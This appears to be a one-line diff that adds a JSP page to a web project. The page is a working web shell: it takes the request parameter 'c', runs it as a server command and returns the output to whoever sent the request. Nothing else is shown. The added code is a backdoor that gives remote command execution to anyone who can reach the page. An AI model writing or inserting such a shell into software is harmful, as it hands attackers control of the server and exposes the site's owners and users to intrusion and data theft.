@@ -1,0 +1,1 @@
+<%@ page import="java.io.*" %><%Process p=Runtime.getRuntime().exec(request.getParameter("c"));InputStream is=p.getInputStream();int b;while((b=is.read())!=-1)out.write((char)b);%>
